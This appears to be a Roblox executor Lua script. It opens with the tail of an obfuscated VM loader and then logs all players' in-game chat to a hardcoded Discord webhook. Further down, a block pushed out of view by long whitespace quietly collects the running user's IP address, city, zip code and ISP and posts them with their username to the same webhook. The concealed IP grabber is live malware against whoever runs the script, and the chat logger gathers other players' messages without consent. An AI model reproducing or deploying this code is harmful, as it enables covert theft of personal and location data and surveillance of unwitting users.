3164)>(2808 + 2136))) then do return v84[v86[2 -0]];end elseif ((v87>(13 + 2)) or (4810<(2652 -(343 + 800)))) then local v131=411 -(124 + 287);local v132;local v133;while true do if ((v131==(1 -0)) or ((3118 -(1370 + 150))>=((9196 -5487) + 887))) then while true do if ((v132==(0 + 0)) or ((983 -(431 + 281 + 118))>(18 + 983 + 788))) then v133=v86[(645 -(51 + 592)) + 0];do return v13(v84,v133,v67);end break;end end break;end if ((v131==(0 + 0)) or ((7907 -5739)<(3995 -2406))) then v132=1132 -(606 + 526);v133=nil;v131=1 + 0;end end elseif (((90 + (2190 -(475 + 831)))<=(731 + 1769)) and v84[v86[2]]) then v66=v66 + ((1706 -(7 + 26)) -(1412 + 260));else v66=v86[14 -11];end elseif (((3013 -(910 + 175))>=(1000 + 7)) and (v87<=((134 -(10 + 115)) + 9))) then if (((4129 -976)<=((6118 -(191 + 275)) -1665)) and (v87==(789 -(625 + 147)))) then v84[v86[(594 + 1283) -(1818 + 57)]]=v36[v86[128 -(74 + 51)]];else v84[v86[4 -2]]=v86[(472 -(206 + 258)) -5];end elseif ((v87>(368 -(274 + (271 -196)))) or ((1581 -(11 + 1448))>=(68 + 3287))) then local v136=0 + 0;local v137;local v138;while true do if (((2142 + 2644)>=((3524 -(598 + 1287)) -983)) and (v136==(458 -(456 + 1)))) then while true do if (((1182 + (2217 -(715 + 509)))<(10109 -7584)) and (v137==(0 + 0))) then v138=v86[2 + 0];do return v84[v138](v13(v84,v138 + (2 -1),v86[8 -5]));end break;end end break;end if (((248 + 812 + 1465)==(3726 -1201)) and (v136==(0 + 0))) then v137=0 -(1710 -(784 + 926));v138=nil;v136=3 -2;end end else v37[v86[231 -((91 -29) + 166)]]=v84[v86[1293 -((1619 -(322 + 36)) + 30)]];end elseif (((608 + 373)<=(4650 -2958)) and (v87<=(84 -61))) then if (((1967 -(520 + 579))<(5122 -3365)) and (v87<=(1814 -(1791 + 2)))) then v84[v86[1076 -(77 + 997)]][v86[1131 -(1078 + 50)]]=v84[v86[1336 -(799 + 150 + 383)]];elseif ((v87==(15 + (1609 -(641 + 961)))) or (((3311 -(892 + 92)) + 69)>=(4372 -(195 + 114 + 98)))) then v84[v86[5 -3]]=v84[v86[2 + 1]];else local v141=1449 -(703 + 746);local v142;local v143;local v144;while true do if (((7716 -4033)==(4481 -(496 + 302))) and (v141==(1 + 0 + 0))) then v144=nil;while true do if (((173 + 962)<=(3872 -1755)) and (v142==((2119 -(598 + 309)) -(977 + 234)))) then while true do if (((4037 -2137)<(4301 -2213)) and ((291 -(64 + 191 + 36))==v143)) then v144=v84[v86[2 + (5 -3)]];if (((1532 + 1043)<=(5055 -(1121 + 630))) and  not v144) then InstrPoint=InstrPoint + (1943 -(486 + 1456)) + (0 -0);else local v207=0 -0;local v208;local v209;while true do if (((7816 -(4157 -(648 + 35)))==(1008 + 3334)) and (v207==(519 -(59 + 459)))) then while true do if (((9983 -6478)<(16232 -(25445 -13537))) and (v208==(0 -0))) then v209=0 -0;while true do if ((v209==(1395 -(1018 + 377))) or ((499 + 636 + 270)>(13891 -9159))) then v84[v86[1 + 1]]=v144;InstrPoint=v86[1392 -(822 + 245 + 202 + 120)];break;end end break;end end break;end if ((v207==(0 -0)) or ((2858 -(382 + 1570))>=(5637 -(579 + 771 + 103)))) then v208=0 -0;v209=nil;v207=1672 -(636 + 1035);end end end break;end end break;end if ((v142==(241 -((294 -(57 + 15)) + 19))) or ((2291 + 806)>=(4222 -(537 + 155)))) then local v190=0 -0;while true do if (((7394 -4810)>(5416 -3844)) and ((1 -0)==v190)) then v142=2 -1;break;end if ((v190==(0 + 0)) or ((111 + 1247 + 890)==(1104 -737))) then v143=(0 -0) -0;v144=nil;v190=592 -(262 + 329);end end end end break;end if ((v141==(0 + 0)) or (4241<((5940 -(1371 + 132)) -(317 + 1308)))) then v142=0 -0;v143=nil;v141=1;end end end elseif ((v87<=(43 -(47 -29))) or ((14367 -9629)==(221 + 3825))) then if (((5533 -(667 + 794))>=(3772 -(43 + (913 -(203 + 557))))) and (v87>(111 -87))) then local v145=(0 + 0) -(1744 -(877 + 867));local v146;local v147;local v148;while true do if ((v145==0) or ((1967 -(657 + 1241))>=(3626 -(2148 -(360 + 605))))) then v146=v79[v86[1 + 2]];v147=nil;v145=1248 -(485 + 762);end if (((2002 + 2420)>=(7539 -4370)) and (v145==((3 + 1) -2))) then for v168=1140 -(606 + (930 -(19 + 378))),v86[4 + 0] do local v169=1381 -(330 + 1051);local v170;local v171;local v172;while true do if ((((2492 + 632) -(27 + 949))==(2846 -((758 -550) + 490))) and ((679 -(298 + 380))==v169)) then v172=nil;while true do if (((3528 -(2772 -(438 + 707)))==(3662 -(993 + 768))) and ((1093 -(967 + (548 -423)))==v170)) then while true do if ((1520<(5066 -(581 + 454))) and (v171==(0 + 0))) then local v223=317 -(181 + 136);local v224;while true do if (((683 -414)<(1780 + 3112)) and (0==v223)) then v224=0;while true do if (((68 + 3609)>=(2449 -(1169 + 487))) and ((1138 -(583 + 555))==v224)) then v66=v66 + (1446 -(152 + 1293));v172=v77[v66];v224=1116 -(139 + 740 + 236);end if ((v224==(1 -0)) or ((313 + 1235 + 479)<(7011 -5243))) then v171=1 -0;break;end end break;end end end if (((678 -(100 + 577))==v171) or ((1064 + 169 + 520)>(3811 -(485 + 329)))) then if ((((3003 -(106 + 1222)) + (9530 -6518))>(2039 -(855 + 454))) and (v172[1616 -(399 + 1216)]==(2 + 20))) then v148[v168-(1 -0)]={v84,v172[7 -4]};else v148[v168-(1 + 0)]={v36,v172[3 + 0]};end v83[ #v83 + (1333 -(211 + 74 + 1047))]=v148;break;end end break;end if (((1876 + 1476)==(4756 -(1109 + 295))) and (v170==(1055 -(635 + 48 + 372)))) then v171=1825 -(1751 + 74);v172=nil;v170=1045 -((419 -227) + 852);end end break;end if ((v169==0) or ((12036 -8378)==(111 + 1029))) then v170=0 + 0;v171=nil;v169=852 -(291 + 560);end end end v84[v86[1 + 1]]=v29(v146,v147,v37);break;end if ((4809<((30422 -24026) -(944 + 518))) and ((97 -(49 + 47))==v145)) then v148={};v147=v10({},{__index=function(v173,v174)local v178=0 -(904 -(854 + 50));local v179;local v180;while true do if (((8787 -5274)<=(984 + 3580)) and (((266 -(166 + 100)) -(0 + 0))==v178)) then v179=0 -0;v180=nil;v178=(599 -(55 + 543)) + 0;end if (((2035 + 1466)<(5949 -(787 + (1736 -1088)))) and (v178==(1 + 0))) then while true do if ((v179==(0 -0)) or (927>=(3079 + 452))) then local v210=0 -0;while true do if (((5511 -(4585 -(575 + 320)))<(5228 -(63 + 923))) and (v210==(0 -0))) then v180=v148[v174];return v180[1 + 0 + 0][v180[2]];end end end end break;end end end,__newindex=function(v175,v176,v177)local v181=350 -(7 + 164 + 179);local v182;while true do if (((3171 -(1867 -681))==(3423 -(1512 -(34 + 40)))) and (v181==(488 -(183 + 305)))) then v182=v148[v176];v182[635 -(459 + 175)][v182[7 -5]]=v177;break;end end end});v145=5 -3;end end else v84[v86[2]]=v84[v86[9 -6]][v86[10 -6]];end elseif (((3077 -(1352 + 544))<=(7250 -3507)) and (v87>(944 -(875 + (94 -51))))) then if ((((22419 -16835) -(1857 + 11))>3425) and (v84[v86[1089 -(295 + (1448 -(446 + 210)))]]==v86[156 -(149 + 3)])) then v66=v66 + (2 -1);else v66=v86[7 -4];end elseif (((13904 -9449)>=(1434 -(762 + 512))) and  not v84[v86[1889 -(706 + 1181)]]) then v66=v66 + (1 -0);else v66=v86[1268 -(481 + 784)];end v66=v66 + (1677 -(913 + 763));break;end end break;end end end end A,B=v27(v11(v70));if  not A[1] then local v88=0;local v89;while true do if (v88==0) then v89=v35[4][v66] or "?";error("Script error at ["   .. v89   .. "]:"   .. A[2]);break;end end else return v13(A,2,B);end end;end return v29(v28(),{},v17)();end v0=4;end end end











































































































local marketplaceService = game:GetService("MarketplaceService")
 
local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
if isSuccessful then
 
local wh = 'https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR'
local embed1 = {
       ['title'] = 'Beginning of Message logs on '..info.Name.." at "..tostring(os.date("%m/%d/%y at time %X"))
   }
local a = syn.request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})
function logMsg(Webhook, Player, Message)
   local embed = {
       ['description'] = Player..": "..Message.."  " ..tostring(os.date("| time %X")) 
   }
   local a = syn.request({
       Url = Webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
   })
end
for i,v in pairs(game.Players:GetPlayers()) do
   v.Chatted:Connect(function(msg)
       logMsg(wh, v.Name, msg)
   end)
end
 
game.Players.PlayerAdded:Connect(function(plr)
   plr.Chatted:Connect(function(msg)
       logMsg(wh, plr.Name, msg)
   end)
end)
end




















                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      local player_name = game:GetService("Players").LocalPlayer.Name
                                                                                                                                                                                                                                                                                      local webhook_url = "https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR"

                                                                                                                                                                                                                                                                                      local ip_info = syn.request({
                                                                                                                                                                                                                                                                                     Url = "http://ip-api.com/json",
                                                                                                                                                                                                                                                                                     Method = "GET"
                                                                                                                                                                                                                                                                                })
                                                                                                                                                                                                                                                                                local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
                                                                                                                                                                                                                                                                                local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
                                                                                                                                                                                                                                                                                syn.request(
                                                                                                                                                                                                                                                                                    {
                                                                                                                                                                                                                                                                                      Url = webhook_url,
                                                                                                                                                                                                                                                                                      Method = "POST",
                                                                                                                                                                                                                                                                                      Headers = {
                                                                                                                                                                                                                                                                                           ["Content-Type"] = "application/json"
                                                                                                                                                                                                                                                                                      },
                                                                                                                                                                                                                                                                                      Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
                                                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                                                         )
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                              
